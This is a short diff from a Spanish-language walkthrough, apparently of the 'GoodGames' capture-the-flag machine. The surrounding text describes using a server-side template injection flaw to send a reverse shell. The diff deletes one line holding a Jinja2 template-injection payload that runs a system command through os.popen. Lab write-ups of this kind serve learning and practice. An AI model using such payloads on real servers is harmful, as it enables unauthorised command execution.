@@ -153,7 +153,7 @@ Detectamos una vulnerabilidad SSTI (Server Side Template Injection) al modificar
 
 Enviamos una reverse shell a nuestra máquina desde la vulnerabilidad SSTI:
 
-\{\{ namespace.__init__.__globals__.os.popen('id').read() \}\}
+
 
 ![Código de reverse shell SSTI](/assets/images/goodgames/12-ssti-reverse-shell.png)
 
